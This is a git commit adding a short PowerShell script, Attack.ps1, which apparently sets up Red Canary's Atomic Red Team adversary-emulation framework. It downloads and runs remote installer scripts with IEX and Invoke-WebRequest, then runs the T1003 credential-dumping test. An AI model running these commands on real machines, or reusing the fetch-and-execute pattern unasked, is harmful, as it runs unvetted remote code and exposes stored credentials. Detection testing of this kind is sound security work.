1ce5a30c163422a7efe366ff2df2e506ed5df5ea
Arda Büyükkaya <42712921+whichbuffer@users.noreply.github.com>
2021-05-19 20:18:49 +0300

    Add files via upload

---
+++ Attack.ps1
@@ -0,0 +1,6 @@
+IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
+Install-AtomicRedTeam
+IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicsfolder.ps1' -UseBasicParsing);
+Install-AtomicsFolder
+Invoke-AtomicTest T1003  -Interactive
+
